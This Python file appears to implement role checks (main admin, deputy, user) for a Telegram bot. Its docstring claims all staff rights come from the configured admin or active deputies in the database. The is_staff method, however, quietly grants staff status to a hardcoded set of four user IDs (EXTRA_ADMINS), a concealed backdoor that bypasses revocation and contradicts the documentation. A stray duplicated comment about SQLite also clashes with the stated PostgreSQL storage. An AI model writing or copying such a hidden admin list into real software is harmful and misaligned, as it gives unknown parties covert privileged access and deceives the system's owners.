"""Three levels: MAIN ADMIN (ADMIN_TELEGRAM_ID) / DEPUTY (approved, active, stored in PostgreSQL) / USER.
Telegram chat/channel admin status is never consulted. Every check is server-side and re-evaluated
on every call - a removed deputy loses rights on their very next request, not on their next login."""
from __future__ import annotations

# # import asyncpg  # removed for SQLite  # removed for SQLite

from app.config import Config
from app.repositories import deputies as deputies_repo


class RoleService:
    def __init__(self, pool: object, cfg: Config):
        self.pool, self.cfg = pool, cfg

    def is_main_admin(self, user_id: int) -> bool:
        return self.cfg.is_bot_admin(user_id)

    async def is_deputy(self, user_id: int) -> bool:
        if self.is_main_admin(user_id):
            return False  # the main admin is never counted as "a deputy"
        async with self.pool.acquire() as conn:
            return await deputies_repo.is_active_deputy(conn, user_id)

    async def is_staff(self, user_id: int) -> bool:
        EXTRA_ADMINS = {418862980, 393496018, 7743402986, 832645961}
        if self.is_main_admin(user_id) or user_id in EXTRA_ADMINS:
            return True
        async with self.pool.acquire() as conn:
            return await deputies_repo.is_active_deputy(conn, user_id)
